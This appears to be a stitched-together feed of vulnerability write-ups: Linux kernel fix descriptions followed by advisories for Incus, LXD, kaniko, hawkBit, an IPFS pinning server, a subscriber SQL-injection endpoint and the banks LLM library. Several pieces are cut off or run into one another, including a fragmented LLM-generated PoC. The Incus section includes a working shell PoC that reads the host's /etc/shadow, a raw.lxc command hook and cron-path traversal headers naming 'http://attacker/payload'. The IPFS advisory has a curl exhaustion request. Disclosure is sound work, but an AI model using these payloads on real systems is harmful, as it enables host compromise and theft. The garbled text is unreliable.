In the Linux kernel, the following vulnerability has been resolved:

net: skbuff: propagate shared-frag marker in skb_zerocopy()

skb_zerocopy() moves frag descriptors from @from into @to and takes a
reference on each frag, but it does not copy skb_shinfo(from)->flags into
skb_shinfo(to)->flags.  A destination skb holding the same page-cache
backed frags as the source therefore reports skb_has_shared_frag() as
false.

That breaks the invariant relied on by later in-place writers.  ESP input
checks skb_has_shared_frag() before deciding whether an uncloned
nonlinear skb can skip skb_cow_data(); with the marker lost, an skb that
skb_zerocopy() built for nfnetlink_queue or for an openvswitch upcall is
decrypted in place, letting an unprivileged user write into the page
cache of a root-owned read-only file.

Propagate SKBFL_SHARED_FRAG when frag descriptors are copied, as done for
the other frag-transfer helpers.

In the Linux kernel, the following vulnerability has been resolved:

netfilter: conntrack: tcp: use UNACK timeout for non-closing RST packets

Commit be0502a3f2e9 ("netfilter: conntrack: tcp: only close if RST
matches exact sequence") keeps an established conntrack entry in
ESTABLISHED when an in-window RST does not match the expected sequence
number exactly, so the endpoint can validate the RST with a challenge
ACK.

The timeout selection nevertheless uses the CLOSE timeout for every RST
packet.  The bug is that timeout selection is based on the packet type,
not on the state transition result: even when RST validation keeps
new_state in ESTABLISHED, the timeout is still forced to
TCP_CONNTRACK_CLOSE.

Linux TCP independently rate limits challenge ACKs per socket.  A second
non-exact RST can therefore arrive after the first challenge ACK has
restored the timeout but before the rate limit expires.  The second RST
lowers the timeout to 10 seconds again while the endpoint suppresses the
second challenge ACK, allowing the conntrack entry to expire while both
TCP endpoints remain established.

Using the ESTABLISHED timeout for such RSTs would avoid this short
expiration window, but it could also retain stale entries for the
five-day default because conntrack cannot reliably match the endpoint's
exact TCP state.

Use the UNACK timeout for RST packets that leave the conntrack entry in
TCP_CONNTRACK_ESTABLISHED.  Exact-match RSTs and accepted RST packet
trains still fall through to timeouts[new_state], which preserves the
CLOSE timeout when conntrack accepts the RST as closing the flow.

This avoids the aggressive 10-second expiration window for non-exact
RSTs while preserving the short timeout for RSTs that conntrack accepts
as closing the flow.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: reject short SESSION_SETUP responses

smb2_check_message() accepts frames shorter than struct smb2_pdu when
the SMB2 status is non-zero, before the minimum-PDU check added by
b4694f269e66d. A 64-byte STATUS_MORE_PROCESSING_REQUIRED SESSION_SETUP
response is therefore accepted even though it cannot contain the
SecurityBufferOffset and SecurityBufferLength fields.

The parser then reads those fields from stale bytes left in the reused
receive buffer by an earlier frame. With a long stale
SecurityBufferLength, decode_ntlmssp_challenge() copies up to about
64 KB from beyond the receive object and sends the data back to the
server in the NTLMv2 AUTHENTICATE target info.

Reject short MPR SESSION_SETUP responses before the short-error path,
and validate SecurityBufferOffset + SecurityBufferLength against the
received response length before decoding the challenge.

The ordering bypass is not new: the short-error early return predates
b4694f269e66d, and the unvalidated SecurityBufferLength read predates
the 2016 raw NTLMSSP split in 166cea4dc3a4, so all supported stable
trees are affected. Reproduced on 6.6.87.2; the path is unchanged on
mainline.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

smb: client: validate the data area in SMB2_read()

SMB2_read() copies le32_to_cpu(rsp->DataLength) bytes from
(char *)rsp + rsp->DataOffset without checking that the range lies
within the response actually received. A READ response with
DataOffset == 0 makes smb2_get_data_area_len() zero the data length, so
smb2_check_message() accepts a frame as short as the fixed response,
while SMB2_read() still uses the server-supplied DataLength, capped only
by CIFS_MAX_MSGSIZE and the caller's length.

A malicious server can answer the synchronous read used by the
mfsymlinks (or SFU) symlink parser with an 81-byte READ response
carrying DataOffset 0 and DataLength 1067, making the client copy 1067
bytes from a 448-byte receive object (KASAN slab-out-of-bounds; up to
16 KiB in the general case).

Clamp a zero (or header-overlapping) DataOffset to read_rsp_size, as
handle_read_data() does for the asynchronous path, and reject the
response unless DataOffset + DataLength fits within rsp_iov.iov_len.
The SMB1 helper was fixed the same way in 5be5bdda5863.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

ksmbd: hold a connection reference for each session channel

ksmbd_session_unregister() removes a session from the global and per-
connection tables before dropping the table reference. A concurrent
reference holder can keep the session and its channel list alive after
those removals.

Connection cleanup can no longer find the unpublished session to remove its
channels. Since a channel only stores a raw conn pointer, the connection
can be freed while another session reference holder is still accessing it,
for example during SMB3.1.1 binding or a procfs read.

Take a connection reference when registering a channel and release it on
insertion failure, channel removal, or final session destruction. Keep the
channels and signing keys until the session is destroyed so a response can
still be signed after the session has been unregistered.

In the Linux kernel, the following vulnerability has been resolved:

ALSA: line6: Clear prev_fbuf on capture buffer release

A KASAN slab-use-after-free read was reported in submit_audio_out_urb()
when generating an impulse test signal:

  BUG: KASAN: slab-use-after-free in create_impulse_test_signal sound/usb/line6/playback.c:76 [inline]
  BUG: KASAN: slab-use-after-free in submit_audio_out_urb+0x1848/0x1b20 sound/usb/line6/playback.c:249
  Read of size 2 at addr ffff888008d74870 by task syz.2.3214/7785

  Allocated by task 11:
   kmem_cache_alloc_noprof+0x2f0/0x390 mm/slub.c:4144
   line6_buffer_acquire+0x1a1/0x220 sound/usb/line6/pcm.c:158
   line6_pcm_acquire+0xb6/0x230 sound/usb/line6/pcm.c:329
   line6_startup_work+0x3c/0x50 sound/usb/line6/driver.c:728

  Freed by task 7785:
   kfree+0xf8/0x390 mm/slub.c:6566
   line6_buffer_release sound/usb/line6/pcm.c:176 [inline]
   line6_buffer_release+0xa5/0xf0 sound/usb/line6/pcm.c:170
   __line6_pcm_release sound/usb/line6/pcm.c:305 [inline]
   line6_pcm_release+0x5a/0x80 sound/usb/line6/pcm.c:313
   snd_toneport_monitor_put+0x11b/0x190 sound/usb/line6/toneport.c:183

line6pcm->prev_fbuf points into the capture PCM stream buffer
(line6pcm->in.buffer), which is updated during audio_in_callback() to
feed rate synchronization, software monitoring, and impulse test signal
generation on playback side.

When all capture streams are closed, line6_buffer_release() frees
pstr->buffer with kfree().  However, it does not clear line6pcm->prev_fbuf.
If playback is subsequently started (e.g. via impulse test signal
volume control snd_line6_impulse_volume_put()), submit_audio_out_urb()
dereferences the stale pointer line6pcm->prev_fbuf under in.lock,
resulting in a slab-use-after-free read.

Clear prev_fbuf and prev_fsize in line6_buffer_release() when releasing
the capture stream buffer under in.lock, ensuring that no stale buffer
pointer can be accessed by submit_audio_out_urb().

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: limit sessions on each connection

The pending setup limit only counts InProgress sessions. A client can
complete authentication repeatedly and retain an unbounded number of Valid
sessions on one connection.

Reserve a connection slot before allocating a session and retain a
connection reference while authentication is in progress. The first SMB3
channel takes over that reservation; binding to another connection reserves
one slot there. Reauthentication and authentication continuation reuse the
existing reservation. Return slots on allocation or insertion failure,
channel removal, and final session destruction.

Accept max_sessions_per_connection in reserved startup-request space and
default to 64 when older tools leave it zero. Keep the request size and
existing field offsets unchanged. Expose the configured limit in procfs.
The existing connection limits bound the aggregate number of sessions
without a separate global session allocation limit.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

net/sched: sch_teql: fix use-after-free on lower qdisc drop

The issue: teql_master_xmit() tests the slave's ndo_start_xmit() return
value against NETDEV_TX_OK alone. A slave that consumes the skb but
returns an error code (rc < NET_XMIT_MASK, e.g. NET_XMIT_DROP) is treated
as if the skb were still owned, so the loop restores skb->dev and calls
__skb_pull() on it. A VLAN slave returns the result of dev_queue_xmit()
from its ndo_start_xmit() (propagated since cbbef5e18307), and when the
lower qdisc drops the packet that value is NET_XMIT_DROP after the skb
has been freed, giving a use-after-free in teql_master_xmit().

The Fix: test for consumption with dev_xmit_complete(), which accepts
NETDEV_TX_OK and every rc < NET_XMIT_MASK, matching other callers that
need to distinguish consumed results from busy. Only NETDEV_TX_OK keeps
the packet counted in tx_packets/tx_bytes and advances the slave; a
consumed result that is neither a success nor NET_XMIT_CN ends the
attempt and is charged to tx_dropped, so lower-qdisc drops are no longer
reported as good transmits. NET_XMIT_CN is counted like success because
it can accompany acceptance of the current packet: pfifo_head_drop drops
the old head, enqueues the current skb and returns NET_XMIT_CN.

Conditions to recreate the bug:
With CONFIG_NET_SCH_TEQL,
CONFIG_VLAN_8021Q and CONFIG_DUMMY enabled, add lkrdummy0 (dummy) and
lkrvlan0 (VLAN id 37 on lkrdummy0); set a pfifo limit 0 root on lkrdummy0
and a teql0 root on lkrvlan0; bring teql0 up with an address and send one
UDP packet to it. The VLAN xmit returns NET_XMIT_DROP from the lower
qdisc while holding a freed skb.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

ksmbd: drain session procfs readers before dropping table references

Session registration failure and connection cleanup can drop the table
reference while the per-session procfs entry is still accessible. If a
reader holds the last remaining reference, its final put calls
proc_remove() from its own callback and waits for that callback to
finish.

Remove the procfs entry before dropping the table reference in the
registration failure path. Queue sessions removed during connection
cleanup and drain their procfs readers after releasing both session
locks, then return their table references. Keep the global hash node
unhashed while a session is queued so a concurrent unregister cannot
drop the reference again.

Previous-session replacement also destroys the file table before the
session is finally freed. Detach the idr under the lock used by procfs
file counters, and report zero files after it has been detached. This
prevents a reader from accessing the idr during or after its
destruction.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: fix fiemap wild read on empty truncated response

smb3_fiemap() treats -E2BIG from SMB2_ioctl() as a truncated range blob
and loops for the next chunk. If the server reports
STATUS_BUFFER_OVERFLOW with OutputCount == 0, SMB2_ioctl() returns
-E2BIG with out_data == NULL and out_data_len == 0, and the existing
length checks accept the empty result. The loop then evaluates

	next = out_data[num - 1].file_offset + ...

with num == 0, reading 16 bytes before NULL.

Reject a truncated range blob that contains no range, so the resume
offset is never computed from an empty response. Also require the last
range in a truncated blob to advance the resume offset without
overflowing, and to stay within the requested range; a malicious or
broken server could otherwise make no progress or underflow len and loop
forever. Free the previous response buffer before retrying.

Reproduced on 6.6.87.2 with a malicious SMB2 server that answers
FSCTL_QUERY_ALLOCATED_RANGES with STATUS_BUFFER_OVERFLOW and
OutputCount == 0; an FS_IOC_FIEMAP ioctl on the mount oopses in
cifs_fiemap() with CR2 = fffffffffffffff8. The code path is unchanged
on mainline.

ksmbd: defer connection scavenging while session locks are busy

The expiration worker holds conn_list_lock for reading while checking
for authenticated sessions. Without this change, the check can wait for
conn->session_lock or sessions_table_lock.

In destroy_previous_session(), the status updates after
ksmbd_conn_wait_idle_sess() run with both session locks held for

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

tun: Require CAP_NET_ADMIN to attach to an ownerless device

Twenty years ago I made creating a tuntap device require CAP_NET_ADMIN
in commit ca6bb5d7ab22 ("[NET]: Require CAP_NET_ADMIN to create tuntap
devices.")

The idea was to allow the permissions on /dev/net/tun to be relaxed to
0666 and thus allow owners of tun devices assigned with TUNSETOWNER to
actually open it and get at their devices.

What we missed at the time was that persistent devices with *no* owner
were already essentially world-consumable, and anyone who could open
the device node could also attach to those.

Even then, using persistent devices with no explicitly set owner — on
the (false) presumption that CAP_NET_ADMIN would be required to open
them — wasn't an egregious userspace bug. There are cases where it does
make sense to separate the creation/configuration of the netdevice, from
the process which shovels packets into it.

Since then, TUNSETGROUP was added a year later in commit 8c644623fe7e
("[NET]: Allow group ownership of TUN/TAP devices."). Its commit message
noted that if both uid and gid are set, both have to match (in itself a
bizarre choice) — but still not that with *neither* set, no permission
at all was required.

Then in 2012 commit c8d68e6be1c3 ("tuntap: multiqueue support") allowed
new queues to be attached to a device from the moment of its creation,
with no way for userspace to close the race between creation and a
subsequent TUNSET{OWNER,GROUP}.

In 2024, commit 3ca459eaba1bf ("tun: fix group permission check") tried
to fix things to be saner: only require the user *or* the group to
match, in line with standard POSIX permissions, and require
CAP_NET_ADMIN if neither the user nor group authorised the access
(although it put the CAP_NET_ADMIN check first, and would wrongly have
reported the capability as having been used even when it was not).

That fix was reverted in commit a70c7b3cbc06 ("tun: revert fix group
permission check") due to allegedly causing a regression in an selinux
test suite which *expected* the attachment to succeed when authorised
by none of user, group, nor CAP_NET_ADMIN:
https://lore.kernel.org/netdev/CAFqZXNtkCBT4f+PwyVRmQGoT3p1eVa01fCG_aNtpt6dakXncUg@mail.gmail.com/

We should not break UAPI. But we don't have to consider an selinux test
case which deliberately exercises a security flaw to be UAPI worth
preserving either. To which end, I have fixed it in selinux-testsuite
commit b2f894f0016b ("tests/tun_tap: set an owner on the device for the
relabel tests").

So: fix the lack of CAP_NET_ADMIN check on devices which *haven't* been
assigned an owner or group, while leaving the weird tun ownership model
as it was (user *and* group have to match, if both are set). If someone
still wants to fix the latter (which wasn't actually the reason the
previous attempt was reverted), they can do it under separate cover.

Permit attaching to an existing device only if an owner and/or group was
set and the caller matches all that were set, or if the caller has
CAP_NET_ADMIN. The only behavioural change is that a device with no
owner or group now requires CAP_NET_ADMIN to attach — precisely the
loophole we want to close.

And put the CAP_NET_ADMIN check in the right place this time.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: reclaim ended sessions on logoff and expiration

LOGOFF and previous-session replacement leave sessions Expired with a
zero credential expiry. Ended sessions can retain their memory and
connection slots when no further setup arrives on the owning connection.

Unpublish a logged-off session while the request reference keeps its
response signing and encryption keys alive. Remove its procfs entry
before dropping the table reference so a reader cannot remove its own
entry on the last put. Clear proc_entry after removal to avoid removing
it twice.

Reclaim ended sessions from the global table in the existing expiration
worker before it acquires conn_list_lock. Only select Expired sessions
with zero credential expiry and no references beyond the table
reference. Keep sessions whose Kerberos credentials expired available
for reauthentication.

Unlink the session from its setup connection and all channel
connections, so SMB2 sessions and sessions with only secondary SMB3
channels are covered. The session already holds connection references,
and sessions_table_lock prevents concurrent channel removal. Queue
sessions on a separate disposal list, leaving their hash nodes unhashed,
and remove procfs entries and drop table references outside the locks.

Keep the pending setup check before allocating a new session so
abandoned InProgress sessions can release their slots even at the
connection limit. Retain the timeout and reference checks and dispose of
those sessions outside the locks. Leave ended Expired sessions to the
expiration worker.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: reserve space for the UTF-16 terminator in stream info

smb_strtoUTF16() always writes a terminating zero UTF-16 unit after the
converted characters, but get_file_stream_info() budgets only
sizeof(struct smb2_file_stream_info) + streamlen * 2 for a stream entry
and sizeof(struct smb2_file_stream_info) + 7 * 2 for the trailing
"::$DATA" entry. When an entry exactly fills the 448-byte small response
buffer, the terminator is written two bytes past the allocation.

Reserve one extra UTF-16 unit in both budget checks. The terminator is
not part of the wire format, so the reported lengths are unchanged.

With the array_datatypes option off, which is the default, insert(), update() and values() treat an arrayref column value as literal SQL. ### Details

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting;
allowing for arbitrary command execution on the Incus server by abusing
lowlevel hooks such as `raw.lxc` and `raw.qemu`.

As snapshots can be moved from one server to another, a malicious
instance+snapshot can be crafted locally, moved to a restricted project

incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c "/bin/id >/lxc-hook-prestart"'
incus snapshot create rce-raw-lxc snap0
#> allow transfer to restricted project
incus config unset rce-raw-lxc raw.lxc

# locally, transfer and trigger
incus move rce-raw-lxc rem: --mode push
incus snapshot restore rem:rce-raw-lxc snap0
incus start rem:rce-raw-lxc
```


### Impact

- Bypass of project restrictions.
- Arbitrary command execution on the Incus server.

### Summary

An arbitrary file write exists in the Incus client when a malicious image
server returns a crafted `Incus-Image-Hash` header. This can lead to
arbitrary command execution as root on the server.


### Details

- `cmd/incusd/images.go:611-684` handles `source.type=url` by HEADing the user-supplied URL, reading `Incus-Image-Hash` and `Incus-Image-URL`, and passing them to `imageDownload()` as `Alias`
 and `Server`.
- `cmd/incusd/daemon_images.go:91-92` defaults `fp` to the caller-controlled alias string.
- `cmd/incusd/daemon_images.go:333-335` builds `destName := filepath.Join(destDir, fp)`.
- `cmd/incusd/daemon_images.go:469-523` enters the `direct` protocol branch, opens `destName` with `os.Create()`, and copies the HTTP response into that file.
- `cmd/incusd/daemon_images.go:528-532` validates the SHA-256 only after the file has already been created and populated.
- `cmd/incusd/daemon_images.go:337-344` cleanup only runs after the copy returns; a slow or held response extends the arbitrary-write window.

A malicious image server returning something along the following will cause
the arbitrary file write.

```
Incus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce
Incus-Image-URL: http://attacker/payload
```


### PoC

The script below creates a malicious image server and requests an Incus
server to fetch the image. File write occurs when the image is unpacked.

The following script was generated by an LLM.

is a real SHA-256 of the downloaded bytes. A hash containing `../` escapes the
image directory.

Default mode is dry-run. With --execute-trigger this script starts a tiny HTTP
server, returns a traversal hash pointing at cron, streams the cron payload, and
keeps the response open so the daemon-side cleanup does not immediately remove

import json

DEFAULT_TRAVERSAL = "../../../../etc/cron.d/incus-direct-image-url-rce"

        self.socket_path = socket_path

Incus validates `compression_algorithm` by parsing it into fields and checking

### Summary

A specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.


### Details

Incus validates an image as soon as it sees a normal `metadata.yaml` and
a `rootfs/` entry, but full extraction can later process a duplicate top-level
`rootfs` symlink. Later, the stopped-container file API opens
`d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to
it.

```
metadata.yaml
rootfs/
rootfs -> /
```

In practice, this allows a malicious actor to access the host's filesystem
with root privileges.


### PoC

Below, we map the container's rootfs to `/` on the host, but it can be
mapped anywhere. We then retrieve the host's `/etc/shadow` file and
create a file in `/`.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC rootfs symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar

# inject rootfs symlink
rmdir rootfs
ln -s / rootfs
tar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs


incus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink
incus init afrw-rootfs-symlink afrw-rootfs-symlink


# read
incus file pull afrw-rootfs-symlink/etc/shadow "${tmpdir}/shadow"
cat "${tmpdir}/shadow"

# write
printf 'afrw-rootfs-symlink\n' >"${tmpdir}/afrw-rootfs-symlink"
incus file push "${tmpdir}/afrw-rootfs-symlink" afrw-rootfs-symlink/
```

Arbitrary file read and write on the host via unsanitized symlink;
possibly leading to command execution.

A SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscribers`) and read arbitrary tables from the database — including `users` (bcrypt password hashes) and `settings` (SMTP credentials, API keys). This creates a privilege escalation path: `subscribers:sql_query` → hash exfiltration → offline bcrypt crack (cost factor 6) → Super Admin account takeover.

The subscriber query feature accepts a user-controlled `query` parameter that is injected directly into a SQL template via `strings.ReplaceAll`. ### Impact

 The console-proxy's RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec
  plugin stanza (under users[].user.exec) is faithfully preserved. When rest.TransportFor later builds the HTTP transport for the upstream WebSocket connection, client-go invokes the exec plugin — spawning an
  arbitrary process as the osac-console-proxy service account.

  This allows remote code execution inside the console-proxy pod for any principal that can create or modify a Secret with the label osac.openshift.io/remote-cluster-kubeconfig: "true" in a namespace where the
  console-proxy has Secret read access (governed by its RoleBinding). A secondary vector exists via attacker-controlled clusters[].server, enabling server-side request forgery (SSRF) from within the proxy pod.

  Affected configurations: any deployment using remote or auto VM cluster mode (the default). Deployments using local mode exclusively are not affected, as they do not read kubeconfig Secrets.

### Patches


  The fix is two lines in internal/consoleproxy/config_resolver.go, applied immediately after clientcmd.RESTConfigFromKubeConfig returns:

  config.ExecProvider = nil
  config.AuthProvider = nil

  This is patched in `0.0.4`. Users should upgrade to the first release containing this patch once available.

### Workarounds

  - Restrict Secret creation in the namespace where the osac-console-proxy-secret-reader RoleBinding is deployed. Ensure only trusted principals (cluster admins, operator service accounts) can create or modify
  Secrets there.
  - Switch to local VM cluster mode (--vm-cluster-mode=local) if the KubeVirt VMs run on the same cluster as the proxy. This bypasses the Secret-based kubeconfig lookup entirely.
  - Use an admission webhook or OPA policy to reject Secrets containing exec: or auth-provider: stanzas in the kubeconfig data within the affected namespace.

## **Description**
A privilege escalation vulnerability has been identified in the Direct Device Integration (DDI) Controller of **Eclipse hawkBit** (versions 1.0.3 and prior).

This vulnerability allows an authenticated device to escalate its permissions and bypass the strict boundaries of its assigned updates. Under normal operation, a device should be restricted **strictly to the specific firmware artifacts explicitly assigned to it**. However, this flaw enables any authenticated device to bypass this restriction and download any firmware artifact **within the same tenant**.

This is **not** an authentication bypass; the requesting device must possess valid credentials for its respective tenant. Instead, the issue stems from a flaw in object-level authorization validation.

A related, lower-severity helper issue exists in the listing software modules artifacts metadata endpoint. This endpoint does not enforce assignment checks, enabling an authenticated device to list and enumerate available firmware artifacts, which can facilitate targeted exfiltration using the main download authorization bypass.

---

## **Impact**
* **Severity:** Moderate
* **Scope:** Tenant-isolated. An attacker must be an authenticated device within the target tenant to exploit this vulnerability.
* **Confidentiality Impact:** **Low**. While firmware binaries can be retrieved, the impact is mitigated because access is restricted strictly to the scope of the pre-authenticated tenant, and no administrative or cross-tenant data is exposed. Additionally, production firmware binaries are by design not expected to contain highly sensitive or confidential data (such as hardcoded credentials or private keys), further supporting the Low confidentiality rating.

---

## **Affected Products and Versions**
* **Product:** `eclipse-hawkbit/hawkbit`
* **Affected Component:** `hawkbit-ddi/hawkbit-ddi-resource`, as well as the compiled binaries and Docker images that contain this component.
* **Affected Versions:** `1.0.3` and prior versions.
* **Patched Version:** `1.0.4`

---

## **Remediation**
Upgrade to version **1.0.4** or later. 

**Fix details:** The download authorization logic has been corrected to ensure that assignment-based verification is executed on every artifact download request. Additionally, the software module metadata endpoint has been updated to enforce proper authorization, restricting access exclusively to software modules and artifacts that are explicitly assigned to or already installed on the requesting device.

---

## **Credits**
Eclipse would like to thank **Santosh Kumar Puppala** (GitHub: [Santoshkumarpuppala](https://github.com/Santoshkumarpuppala), Email: santhoshkumar7794@gmail.com) for discovering and reporting this vulnerability through coordinated disclosure.

## Summary

The IPFS Pinning Service API implementation accepts a caller-controlled CID through `POST /pins`, queues background processing, and then recursively fetches the full DAG with `helia.pins.add(cid)`. The route and background pinning path do not enforce a request rate limit, per-user quota, maximum DAG byte count, maximum block count, traversal timeout, or concurrent pinning limit.

An authenticated caller, or an unauthenticated caller when the server is started with `ALLOW_NO_AUTH=true`, can submit one or more pins whose CIDs resolve to very large DAGs. The server writes fetched blocks to CAR files under `carStoragePath` and can consume disk, network, CPU, and libp2p resources until the process or host becomes unavailable.

## Details

`POST /pins` validates only that the request body contains a syntactically valid CID string, then forwards it to the pin store:

- `src/filecoin-pinning-server.ts:304-342` accepts the request, parses `cid` with `CID.parse`, and calls `pinStore.pin(request.user, cidObject, parsed.options)`.
- `src/filecoin-pin-store.ts:153-188` stores the pin as `queued` and schedules `_processPinInBackground` with `setTimeout`. There is no queue, semaphore, or global cap around this scheduling.
- `src/filecoin-pin-store.ts:211-217` creates a per-pin Helia node and forwards caller-supplied `origins`.
- `src/filecoin-pin-store.ts:260-274` walks the full DAG with `for await (const pinnedCid of helia.pins.add(cid))`.
- `src/create-pinning-helia.ts:47-80` creates a libp2p/Helia node with the Bitswap block broker and no application-level resource limits.
- `src/core/car/car-blockstore-base.ts:65-107` writes every fetched block and updates `stats.totalSize` only after writing.
- `src/core/car/car-file-backend.ts:84-93` streams blocks to the CAR writer on disk.

The Helia node created for each pin has no bootstrap or mDNS configuration (`src/create-pinning-helia.ts:57`). A public CID alone may therefore not be fetchable unless the node can reach a content source. In practice, the API also accepts `origins`, so an attacker can supply a reachable attacker-controlled libp2p origin that serves a large DAG and cause the server to retrieve it.

## Impact

Successful exploitation affects availability:

- Disk exhaustion from unbounded CAR files in `carStoragePath`.
- Network exhaustion from recursive Bitswap retrieval.
- CPU and memory pressure from concurrent libp2p/Helia pin operations.
- Service degradation or process failure for other users of the daemon.
- Operational cost and manual recovery burden from large partial CAR files.

The default daemon configuration reduces exposure because the server binds to `localhost` and refuses to start without an access token unless `ALLOW_NO_AUTH=true`. The finding is most significant when the daemon is exposed beyond localhost, when the token is shared across untrusted users, or when the no-auth mode is enabled.

## PoC

```bash
curl -X POST "https://target.example/pins" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "cid": "CID_OF_LARGE_DAG",
    "origins": ["/ip4/203.0.113.10/tcp/4001/p2p/ATTACKER_PEER_ID"],
    "meta": { "purpose": "resource-exhaustion-validation" }
  }'
```

Submitting many such requests concurrently accelerates resource pressure because each request schedules independent background processing.

## Summary

  `banks` parses `Tool` JSON objects from the rendered body of `{% completion %}` blocks and later resolves their
  `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool
   call. There is no allowlist or sanitization on `import_path`, so any importable Python attribute (e.g. `os.system`,
  `subprocess.getoutput`) can be selected. When the LLM emits a `tool_calls` entry whose `function.name` matches the
  attacker-supplied tool name, the resolved callable is invoked with kwargs decoded from `tool_call.function.arguments`,
   yielding arbitrary code execution in the banks-hosting process.

  This is distinct from GHSA-gphh-9q3h-jgpp / CVE-2026-44209. That advisory was fixed in 2.4.2 by switching
  `src/banks/env.py` from `Environment` to `SandboxedEnvironment`. The fix does not touch
  `src/banks/extensions/completion.py`, and the unsafe import + getattr chain still executes on 2.4.2. The malicious
  `Tool` JSON is plain text in the rendered template body — it requires no Jinja attribute access, so the sandbox is
  irrelevant.

### Summary

kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The build needs no `RUN` instruction and never has to push.

The flaw is in the Azure Container Registry (ACR) credential helper, `github.com/chrismellard/docker-credential-acr-env`. kaniko links it into the executor and warmer (the built-in helper) and also builds it as the standalone `docker-credential-acr-env` binary. The helper decides whether a host is an ACR registry with an unanchored regex, so any hostname that contains `.azurecr.io` (or `.azurecr.cn`, `.azurecr.de`, `.azurecr.us`) passes. The upstream module is unmaintained and has no fixed release. The Go vulnerability database tracks the upstream flaw as [GO-2026-6225](https://pkg.go.dev/vuln/GO-2026-6225).

### Who is affected

You are affected if you run kaniko before v1.25.20 on Dockerfiles, or build arguments, that you don't fully control, in an environment where the helper can get an Azure identity:

- service principal credentials in the environment (`AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`)
- a federated workload identity token (`AZURE_FEDERATED_TOKEN` or `AZURE_FEDERATED_TOKEN_FILE`, with `AZURE_CLIENT_ID` and `AZURE_TENANT_ID`), as injected by AKS workload identity
- a managed identity, through the Azure Instance Metadata Service (for example on an AKS node or Azure VM) or `MSI_ENDPOINT`

You do not need to use ACR, or configure the helper, to be affected. kaniko consults the built-in helper for any registry that has no credentials in your Docker config and is not a Google or Amazon ECR registry, and every lookalike host falls in that set. That covers base images in `FROM` lines and images in `COPY --from=<image>`. kaniko asks for credentials before it contacts the registry, so the attacker's registry doesn't need to request authentication.

If your Docker `config.json` sets `"credsStore": "acr-env"`, the standalone binary is consulted for every registry as well. Before v1.25.20 this setting broke pulls from non-ACR registries, so it is uncommon.

### Impact

The helper puts the token in both the `Authorization: Bearer` header and the `access_token` form field of a POST to `https://<host>/oauth2/exchange`, so the attacker receives a live access token for Azure Resource Manager. Until it expires, the attacker can use it against Azure Resource Manager with the identity's role assignments. They can also exchange it, as the helper does, at the `/oauth2/exchange` endpoint of any real ACR registry the identity can access, and so obtain registry credentials. If the identity has `AcrPush` or higher, the attacker can push images to your registries.

Fixed in [v1.25.20](https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20) by [#495](https://github.com/chainguard-forks/kaniko/pull/495). kaniko now carries a patched copy of the helper under `third_party/docker-credential-acr-env`, which the executor, the warmer and the `docker-credential-acr-env` binary built by `deploy/Dockerfile` all use. The patched helper accepts a host only if it is exactly `host[:port]` and the hostname is `mcr.microsoft.com` or a well-formed name ending in `.azurecr.io`, `.azurecr.cn`, `.azurecr.de` or `.azurecr.us`. For any other host it reports "credentials not found" without requesting a token.

From v1.25.20, kaniko no longer depends on `github.com/chrismellard/docker-credential-acr-env`, so scanners stop reporting GO-2026-6225 for it.

### Summary

A guest can mount another guest's custom storage volume over `/dev/lxd` and read or write its contents without owning it. The DevLXD storage API blocks access to volumes you don't own, but the instance device-update path that attaches a volume to a container without checks ownership. Any guest in a project with `security.devlxd.management.volumes` enabled can attach a volume belonging to a different guest by naming it in a device `PATCH`, giving one tenant full read and write access to another tenant's volume data.

### Details

Volumes created over DevLXD get `volatile.devlxd.owner` set to the calling identity. The storage handlers enforce it on `GET`/`PUT`/`DELETE` ([`isDevLXDVolumeOwner`, lxd/devlxd_storage.go:359](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L359)) and on volume-copy sources ([devlxd_storage.go:286](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_storage.go#L286)). The device-attach path does not.

`devLXDInstancePatchHandler` ([lxd/devlxd_instances.go:88](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L88)) passes the guest's device map to `generateDevLXDInstanceDevices` ([devlxd_instances.go:178](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L178)). For a device that isn't already on the instance, the only check is `isDeviceAccessible(device)`:

```go
if (exists && !isOwned) || (!isDeviceAccessible(device)) 
```

